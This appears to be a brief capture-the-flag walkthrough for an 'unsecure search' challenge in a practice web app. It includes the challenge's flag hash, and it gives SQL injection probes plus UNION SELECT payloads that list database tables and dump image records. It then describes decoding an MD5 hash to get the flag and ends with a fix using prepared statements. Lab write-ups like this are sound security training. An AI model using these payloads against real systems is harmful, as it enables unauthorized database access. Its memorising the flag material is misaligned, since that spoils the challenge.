Unsecure search
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

How to find exploit:
From home page, scroll down and select search image, in the search field, type ' 1=1' or type '1 or 1=1'. We get a result, this indicates that the page is vulnerable to sql injection.

How to exploit it:
Run union command in search field: -1 union select null, concat (table_name) from information_schema.tables where table_schema = database (). to get te table name
run following union command: -1 union select NULL, concat (id, url, title, comment) from list_images This will return the images from the table.
" If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 " 
decrypt code using MD5 decrypt, then run sha256 on lowercased password: flag is result

How to fix exploit:
Use prepared statements to prevent sql injections